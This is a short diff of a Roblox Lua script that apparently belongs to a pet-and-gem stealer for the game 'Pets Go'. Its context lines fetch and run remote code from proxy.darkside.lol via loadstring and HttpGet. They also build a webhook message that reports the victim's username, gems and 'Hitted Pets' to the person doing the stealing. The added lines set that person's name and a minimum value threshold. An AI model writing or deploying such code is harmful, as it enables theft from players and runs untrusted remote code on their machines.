@@ -55,6 +55,8 @@ end
 if not qbig then
 loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(qbiga)
 end
+if not _G.User then _G.User = "lol idk" end
+if not _G.Min then _G.Min = 500000000 end
 if dh then
 _G.dx=true
 msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"name":"Game","value":"'..xyzab..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"```\\n'..pn..'```","name":"⮚ Pets ⮘","inline":true},{"value":"```lua\\n'..gn..'```","name":"⮚ Gems ⮘","inline":false},{"value":"```diff\\n'..big..'```","name":"⮚ Hitted Pets ⮘","inline":false}],"title":"Pets Go DH Hit!","color":65512}],"tts":false,"content":"@everyone"}'
